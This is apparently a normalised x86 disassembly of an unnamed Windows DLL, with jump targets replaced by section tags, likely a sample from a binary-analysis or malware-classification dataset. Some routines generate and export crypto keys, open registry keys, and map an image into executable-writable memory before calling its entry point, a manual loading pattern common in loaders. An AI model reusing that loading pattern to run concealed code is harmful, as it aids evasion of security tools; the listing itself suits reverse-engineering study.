pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
mov eax edi
jmp r-xdata
pop edi
pop esi
sub_10019620
push ebp
mov ebp esp
push 0xffffffff
push sub_10080b80
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x71c71c7
jbe r-xdata
mov ecx edi
call sub_100689c0
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
call sub_10041070
add esp 0x10
mov [ esi + 0x4 ] eax
push r--data
call sub_100616c6
sub_100196f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_1003b4a6
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_100616c6
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100616c6
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_1004d5e0
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov [ eax ] bl
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
add ecx ebx
add eax ebx
push ecx
add eax edi
push eax
call sub_10077d10
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
add ecx [ ebp + 0x10 ]
push edi
push ecx
add eax ebx
push eax
call sub_10078600
push edi
add ecx edx
mov eax esi
push ecx
add eax ebx
push eax
call sub_10077d10
jmp r-xdata
mov eax [ esi ]
push edi
add ecx edx
push ecx
add eax ebx
push eax
call sub_10077d10
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x14 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_10019870
push ebp
mov ebp esp
sub esp 0x68c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi edx
mov [ ebp - 0x684 ] ecx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x60 ]
xor eax eax
add ecx 0x80000001
mov [ ebp - 0x688 ] ecx
call sub_100121e0
lea edx [ ebp - 0x68c ]
mov eax 0x3
call sub_100121e0
lea edx [ ebp - 0x680 ]
mov eax 0x1
call sub_100121e0
lea edx [ ebp - 0x67c ]
mov eax 0x5
call sub_100121e0
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
lea ecx [ ecx ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_10030af0
test eax eax
je r-xdata
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
jne r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_10030af0
test eax eax
jne r-xdata
mov edi [ StrStrW@IAT ]
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x68c ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10030af0
test eax eax
jne r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10030af0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x688 ]
lea edx [ ebp - 0x688 ]
push edx
push 0x20119
push eax
lea eax [ ebp - 0x60 ]
push eax
push ecx
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x688 ]
push edx
mov eax ebx
push eax
call sub_10028980
add esp 0x8
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10019b0f
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x800003
push 0x6801
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
xor eax eax
inc eax
lea eax [ ebp - 0x8 ]
push eax
call sub_1000eb9b
jmp r-xdata
push [ ebx ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x8
xor eax eax
inc eax
cmp eax edi
je r-xdata
push ebx
push eax
push edi
push 0x8
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_10019c0f
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_10017366
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002868d
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1005ae42
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10019dd0
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp [ esi + 0x98 ] 0x0
push edi
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x78 ]
mov ecx [ eax + 0x78 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x90 ]
push eax
lea edi [ esi + 0x70 ]
push edi
call sub_1001bfe0
mov ecx [ esi + 0x78 ]
mov eax [ ecx + 0x50 ]
push 0x40
push 0x3000
push eax
push 0x0
mov [ esi + 0x9c ] eax
call [ VirtualAlloc@IAT ]
mov [ esi + 0x98 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x8c ]
cmp [ eax + ecx + 0x14 ] 0x2
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x8 ]
mov edx [ ecx + 0x50 ]
mov ecx [ edi + 0x1c ]
push edx
push ecx
push eax
call sub_10078600
mov edx [ esi + 0x98 ]
add esp 0xc
push edx
mov eax edi
call sub_10015f10
test eax eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x153
call sub_1001bb80
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ eax + ecx + 0x1c ]
mov eax [ ecx + eax + 0x4 ]
xor eax eax
jmp r-xdata
mov edi [ esi + 0x98 ]
add edi eax
jne r-xdata
push ebx
mov ebx [ esi + 0x98 ]
mov eax edi
call sub_10050d50
pop ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x13f
call sub_1001bb80
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28 ]
mov eax 0xb5
call sub_1001bb80
lea edx [ ebp - 0x40 ]
mov eax 0x8b
call sub_1001bb80
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0xeb
call sub_1001bb80
lea eax [ edi + 0x5 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x78 ]
mov eax [ esi + 0x98 ]
mov edx [ ecx + 0x28 ]
push 0x0
push 0x1
push eax
add edx eax
call edx
lea edx [ ebp - 0x6c ]
mov eax 0x6e
call sub_1001bb80
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x7c ]
push ecx
call edi
mov edx [ ebp - 0x78 ]
push edx
push 0x8
mov [ esi + 0x50 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x7c ]
mov edi eax
mov eax [ ebp - 0x78 ]
push eax
push ecx
push edi
call sub_10078600
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x84 ] edi
add esp 0xc
lea edi [ esi + 0xa0 ]
lea eax [ ebp - 0x84 ]
mov [ ebp - 0x80 ] edx
call sub_100608e0
mov eax [ esi + 0x78 ]
mov eax [ eax + 0x78 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov ecx [ esi + 0x8c ]
cmp [ ecx + eax + 0x14 ] 0x3
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ecx + eax + 0x1c ]
mov edx [ esi + 0x8c ]
mov eax [ ecx + edx + 0x8 ]
mov edx [ esi + 0x98 ]
lea ecx [ ebp - 0x7c ]
push ecx
add edx eax
call edx
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001a026
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1001a041
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
call [ GetStringTypeW@IAT ]
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_1001a062
push 0x4
mov eax sub_1007efe5
call sub_10050d0f
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
je r-xdata
push ebx
push eax
mov ecx esi
call sub_1004942d
mov eax esi
call sub_1001a1b3
retn 0xc
lea edi [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x10
jb r-xdata
cmp eax ebx
ja r-xdata
push edi
push [ ebp + 0x10 ]
add ecx eax
push [ ebp + 0xc ]
push ecx
push edx
call sub_10047277
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push ebx
push eax
mov ecx esi
call sub_1004942d
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
sub_1001a0eb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002f971
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1001a10c
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10013757
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1001a1c7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_1001a1e8
push 0x14
push r--data
call sub_10078b50
or [ ebp - 0x20 ] 0xffffffff
call sub_10044fed
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1000d124
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10079b57
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10028397
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10078b95
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10011bc8
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_10012991
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10020a90
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10020a90
pop ecx
push 0xd
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a349
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10020a90
pop ecx
sub_1001a390
push ebp
mov ebp esp
push 0xffffffff
push sub_100801d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x4444444
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_10060ce0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10064cd0
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
shl ecx 0x4
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
mov ecx ebx
shl ecx 0x4
sub ecx ebx
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
mov edi [ esi + 0x4 ]
mov eax [ esi ]
push ecx
call sub_1005e020
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x8
sub_1001a495
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_10078970
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_1007c060
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_1005d3a9
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_1005d3a9
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_1000b659
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_1007c060
test eax eax
sub_1001a5b4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10017de5
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_1001a5e2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_1003b4a6
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10077d10
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_1001a670
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
xor edi edi
mov ecx ebx
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
call sub_10045010
fldz
fstp [ esi + 0x10 ]
mov [ esi ] r--data
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0xde
call sub_1000a6f0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x24 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x24 ]
push ecx
push edi
push eax
mov [ esi + 0xc ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
fld [ ebx + 0x10 ]
